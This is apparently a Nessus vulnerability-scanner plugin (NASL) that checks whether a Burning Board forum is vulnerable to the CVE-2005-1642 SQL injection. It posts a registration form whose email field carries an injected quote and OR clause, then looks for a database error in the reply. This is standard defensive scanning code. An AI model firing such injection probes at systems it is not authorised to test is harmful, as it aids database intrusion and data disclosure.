#
# (C) Tenable Network Security
#


if (description) {
  script_id(18293);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2005-1642");
  script_bugtraq_id(13643);
  if (defined_func("script_xref")) {
    script_xref(name:"OSVDB", value:"16575");
  }

  name["english"] = "Burning Board verify_email SQL Injection Vulnerability";
  script_name(english:name["english"]);
 
  desc["english"] = "
Synopsis : 

The remote web server contains a PHP script that is prone to SQL
injection attacks. 

Description :

The version of Burning Board or Burning Board Lite installed on the
remote host suffers from a SQL injection vulnerability in the way it
verifies email addresses when, for example, a user registers.  An
attacker can exploit this flaw to affect database queries, including
possible disclosure of sensitive information. 

See also : 

http://www.gulftech.org/?node=research&article_id=00075-05162005

Solution : 

Contact the vendor for a patch.

Risk factor : 

Medium / CVSS Base Score : 5 
(AV:R/AC:L/Au:NR/C:P/A:N/I:P/B:N)";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for verify_email SQL injection vulnerability in Burning Board";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");

  script_dependencies("burning_board_detect.nasl", "smtp_settings.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Test any installs.
wbb = get_kb_list(string("www/", port, "/burning_board"));
wbblite = get_kb_list(string("www/", port, "/burning_board_lite"));
if (isnull(wbb)) {
  if (isnull(wbblite)) exit(0);
  else installs = make_list(wbblite);
}
else if (isnull(wbblite)) {
  if (isnull(wbb)) exit(0);
  else installs = make_list(wbb);
}
else {
  kb1 = get_kb_list(string("www/", port, "/burning_board"));
  kb2 = get_kb_list(string("www/", port, "/burning_board_lite"));
  if ( isnull(kb1) ) kb1 = make_list();
  else kb1 = make_list(kb1);
  if ( isnull(kb2) ) kb1 = make_list();
  else kb2 = make_list(kb2);
  installs = make_list( kb1, kb2 );
}
foreach install (installs) {
  matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
  if (!isnull(matches)) {
    dir = matches[2];

    # Try to exploit it.
    #
    # nb: the actual user name isn't important - registration will 
    #     always fail since we're botching the passwords.
    user = SCRIPT_NAME;
    email = string(get_kb_item("SMTP/headers/From"), "'%20OR%20nessus");

    postdata = string(
      "r_username=", user, "&",
      "r_email=", email, "&",
      "r_password=x&",
      "r_confirmpassword=y&",
      "send=send&",
      "sid=265da345649b38a9dca833e8478f76e5&",
      "disclaimer=viewed"
    );
    req = string(
      "POST ", dir, "/register.php HTTP/1.1\r\n",
      "Host: ", get_host_name(), "\r\n",
      "Content-Type: application/x-www-form-urlencoded\r\n",
      "Content-Length: ", strlen(postdata), "\r\n",
      "\r\n",
      postdata
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # There's a problem if we get a syntax error.
    if (egrep(pattern: "b>SQL-DATABASE ERROR</b>.+ SELECT COUNT\(\*\) FROM .*_users WHERE email =", string:res) ) {
      security_warning(port);
      exit(0);
    }
  }
}
